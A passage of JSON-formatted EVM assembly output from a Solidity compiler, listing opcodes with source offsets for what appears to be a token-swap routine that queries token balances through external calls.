											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 30,
											"end": 33,
											"name": "DUP1"
										},
										{
											"begin": 22,
											"end": 28,
											"name": "DUP3"
										},
										{
											"begin": 14,
											"end": 20,
											"name": "DUP5"
										},
										{
											"begin": 1,
											"end": 34,
											"name": "CALLDATACOPY"
										},
										{
											"begin": 99,
											"end": 100,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP2"
										},
										{
											"begin": 85,
											"end": 91,
											"name": "DUP5"
										},
										{
											"begin": 81,
											"end": 97,
											"name": "ADD"
										},
										{
											"begin": 74,
											"end": 101,
											"name": "MSTORE"
										},
										{
											"begin": 137,
											"end": 141,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 133,
											"end": 142,
											"name": "NOT"
										},
										{
											"begin": 126,
											"end": 130,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 121,
											"end": 124,
											"name": "DUP3"
										},
										{
											"begin": 117,
											"end": 131,
											"name": "ADD"
										},
										{
											"begin": 113,
											"end": 143,
											"name": "AND"
										},
										{
											"begin": 106,
											"end": 143,
											"name": "SWAP1"
										},
										{
											"begin": 106,
											"end": 143,
											"name": "POP"
										},
										{
											"begin": 169,
											"end": 172,
											"name": "DUP1"
										},
										{
											"begin": 161,
											"end": 167,
											"name": "DUP4"
										},
										{
											"begin": 157,
											"end": 173,
											"name": "ADD"
										},
										{
											"begin": 147,
											"end": 173,
											"name": "SWAP3"
										},
										{
											"begin": 147,
											"end": 173,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "SWAP7"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "MLOAD"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP1"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP4"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "SUB"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP2"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP8"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "DUP1"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "146"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "146"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "GAS"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "CALL"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "147"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "147"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12880,
											"end": 13087,
											"name": "POP"
										},
										{
											"begin": 12843,
											"end": 13087,
											"name": "tag",
											"value": "145"
										},
										{
											"begin": 12843,
											"end": 13087,
											"name": "JUMPDEST"
										},
										{
											"begin": 13133,
											"end": 13136,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 13128,
											"end": 13129,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 13115,
											"end": 13129,
											"name": "DUP15"
										},
										{
											"begin": 13115,
											"end": 13129,
											"name": "DUP2"
										},
										{
											"begin": 13115,
											"end": 13129,
											"name": "MUL"
										},
										{
											"begin": 13114,
											"end": 13136,
											"name": "DUP3"
										},
										{
											"begin": 13114,
											"end": 13136,
											"name": "SWAP1"
										},
										{
											"begin": 13114,
											"end": 13136,
											"name": "DIV"
										},
										{
											"begin": 13114,
											"end": 13136,
											"name": "SWAP2"
										},
										{
											"begin": 13163,
											"end": 13177,
											"name": "SWAP1"
										},
										{
											"begin": 13163,
											"end": 13177,
											"name": "DUP15"
										},
										{
											"begin": 13163,
											"end": 13177,
											"name": "MUL"
										},
										{
											"begin": 13162,
											"end": 13184,
											"name": "DIV"
										},
										{
											"begin": 13203,
											"end": 13217,
											"name": "DUP15"
										},
										{
											"begin": 13203,
											"end": 13217,
											"name": "ISZERO"
										},
										{
											"begin": 13199,
											"end": 13259,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 13199,
											"end": 13259,
											"name": "JUMPI"
										},
										{
											"begin": 13242,
											"end": 13252,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 13242,
											"end": 13252,
											"name": "SLOAD"
										},
										{
											"begin": 13219,
											"end": 13259,
											"name": "PUSH [tag]",
											"value": "151"
										},
										{
											"begin": 13219,
											"end": 13259,
											"name": "SWAP1"
										},
										{
											"begin": 13233,
											"end": 13240,
											"name": "DUP6"
										},
										{
											"begin": 13233,
											"end": 13240,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13242,
											"end": 13252,
											"name": "AND"
										},
										{
											"begin": 13254,
											"end": 13258,
											"name": "DUP5"
										},
										{
											"begin": 13219,
											"end": 13232,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 13219,
											"end": 13259,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13219,
											"end": 13259,
											"name": "tag",
											"value": "151"
										},
										{
											"begin": 13219,
											"end": 13259,
											"name": "JUMPDEST"
										},
										{
											"begin": 13311,
											"end": 13325,
											"name": "DUP14"
										},
										{
											"begin": 13311,
											"end": 13325,
											"name": "ISZERO"
										},
										{
											"begin": 13307,
											"end": 13367,
											"name": "PUSH [tag]",
											"value": "153"
										},
										{
											"begin": 13307,
											"end": 13367,
											"name": "JUMPI"
										},
										{
											"begin": 13350,
											"end": 13360,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 13350,
											"end": 13360,
											"name": "SLOAD"
										},
										{
											"begin": 13327,
											"end": 13367,
											"name": "PUSH [tag]",
											"value": "153"
										},
										{
											"begin": 13327,
											"end": 13367,
											"name": "SWAP1"
										},
										{
											"begin": 13341,
											"end": 13348,
											"name": "DUP5"
										},
										{
											"begin": 13341,
											"end": 13348,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13350,
											"end": 13360,
											"name": "AND"
										},
										{
											"begin": 13362,
											"end": 13366,
											"name": "DUP4"
										},
										{
											"begin": 13327,
											"end": 13340,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 13327,
											"end": 13367,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 13327,
											"end": 13367,
											"name": "tag",
											"value": "153"
										},
										{
											"begin": 13327,
											"end": 13367,
											"name": "JUMPDEST"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP1"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP2"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "MSTORE"
										},
										{
											"begin": 13460,
											"end": 13464,
											"name": "ADDRESS"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP3"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "ADD"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "MSTORE"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP1"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13426,
											"end": 13451,
											"name": "DUP7"
										},
										{
											"begin": 13426,
											"end": 13451,
											"name": "AND"
										},
										{
											"begin": 13426,
											"end": 13451,
											"name": "SWAP2"
										},
										{
											"begin": 13426,
											"end": 13451,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 13426,
											"end": 13451,
											"name": "SWAP2"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP1"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP4"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "ADD"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP3"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP3"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP2"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP1"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP3"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP1"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SUB"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "ADD"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP2"
										},
										{
											"begin": 13426,
											"end": 13451,
											"name": "DUP7"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "DUP1"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "154"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "154"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "POP"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "GAS"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "STATICCALL"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "155"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "155"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "POP"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "POP"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "POP"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "POP"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "MLOAD"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "156"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "156"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "MLOAD"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP2"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "MSTORE"
										},
										{
											"begin": 13525,
											"end": 13529,
											"name": "ADDRESS"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP3"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "ADD"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "MSTORE"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "MLOAD"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP2"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP10"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13491,
											"end": 13516,
											"name": "DUP6"
										},
										{
											"begin": 13491,
											"end": 13516,
											"name": "AND"
										},
										{
											"begin": 13491,
											"end": 13516,
											"name": "SWAP2"
										},
										{
											"begin": 13491,
											"end": 13516,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 13491,
											"end": 13516,
											"name": "SWAP2"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP3"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "ADD"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP3"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 13426,
											"end": 13466,
											"name": "SWAP3"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP2"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP3"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SUB"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "ADD"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP2"
										},
										{
											"begin": 13491,
											"end": 13516,
											"name": "DUP7"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "DUP1"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "157"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "157"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "POP"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "GAS"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "STATICCALL"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "158"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "158"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "POP"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "POP"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "POP"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "POP"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "MLOAD"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "159"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "159"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "MLOAD"
										},
										{
											"begin": 13491,
											"end": 13531,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 13551,
											"end": 13565,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13551,
											"end": 13565,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13579,
											"end": 13601,
											"name": "DUP6"
										},
										{
											"begin": 13579,
											"end": 13601,
											"name": "AND"
										},
										{
											"begin": 13579,
											"end": 13601,
											"name": "DUP11"
										},
										{
											"begin": 13579,
											"end": 13601,
											"name": "SWAP1"
										},
										{
											"begin": 13579,
											"end": 13601,
											"name": "SUB"
										},
										{
											"begin": 13568,
											"end": 13601,
											"name": "DUP4"
										},
										{
											"begin": 13568,
											"end": 13601,
											"name": "GT"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "PUSH [tag]",
											"value": "160"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "JUMPI"
										},
										{
											"begin": 13666,
											"end": 13667,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "PUSH [tag]",
											"value": "161"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "JUMP"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "tag",
											"value": "160"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "JUMPDEST"
										},
										{
											"begin": 13640,
											"end": 13650,
											"name": "DUP10"
										},
										{
											"begin": 13628,
											"end": 13637,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13628,
											"end": 13650,
											"name": "AND"
										},
										{
											"begin": 13628,
											"end": 13650,
											"name": "SUB"
										},
										{
											"begin": 13616,
											"end": 13624,
											"name": "DUP4"
										},
										{
											"begin": 13616,
											"end": 13651,
											"name": "SUB"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "tag",
											"value": "161"
										},
										{
											"begin": 13568,
											"end": 13667,
											"name": "JUMPDEST"
										},
										{
											"begin": 13551,
											"end": 13667,
											"name": "SWAP1"
										},
										{
											"begin": 13551,
											"end": 13667,
											"name": "POP"
										},
										{
											"begin": 13677,
											"end": 13691,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13717,
											"end": 13727,
											"name": "DUP10"
										},
										{
											"begin": 13705,
											"end": 13714,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13705,
											"end": 13727,
											"name": "AND"
										},
										{
											"begin": 13705,
											"end": 13727,
											"name": "SUB"
										},
										{
											"begin": 13694,
											"end": 13702,
											"name": "DUP4"
										},
										{
											"begin": 13694,
											"end": 13727,
											"name": "GT"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "PUSH [tag]",
											"value": "162"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "JUMPI"
										},
										{
											"begin": 13792,
											"end": 13793,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "PUSH [tag]",
											"value": "163"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "JUMP"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "tag",
											"value": "162"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "JUMPDEST"
										},
										{
											"begin": 13766,
											"end": 13776,
											"name": "DUP10"
										},
										{
											"begin": 13754,
											"end": 13763,
											"name": "DUP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 13754,
											"end": 13776,
											"name": "AND"
										},
										{
											"begin": 13754,
											"end": 13776,
											"name": "SUB"
										},
										{
											"begin": 13742,
											"end": 13750,
											"name": "DUP4"
										},
										{
											"begin": 13742,
											"end": 13777,
											"name": "SUB"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "tag",
											"value": "163"
										},
										{
											"begin": 13694,
											"end": 13793,
											"name": "JUMPDEST"
										},
										{
											"begin": 13677,
											"end": 13793,
											"name": "SWAP1"
										},
										{
											"begin": 13677,
											"end": 13793,
											"name": "POP"
										},
										{
											"begin": 13836,
											"end": 13837,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 13824,
											"end": 13833,
											"name": "DUP3"
										},
										{
											"begin": 13824,
											"end": 13837,
											"name": "GT"
										},
										{
											"begin": 13824,
											"end": 13854,
											"name": "DUP1"
										},
										{
											"begin": 13824,
											"end": 13854,
											"name": "PUSH [tag]",
											"value": "164"
										},
										{
											"begin": 13824,
											"end": 13854,
											"name": "JUMPI"
										},
										{
											"begin": 13824,
											"end": 13854,
											"name": "POP"
										},
										{
											"begin": 13853,
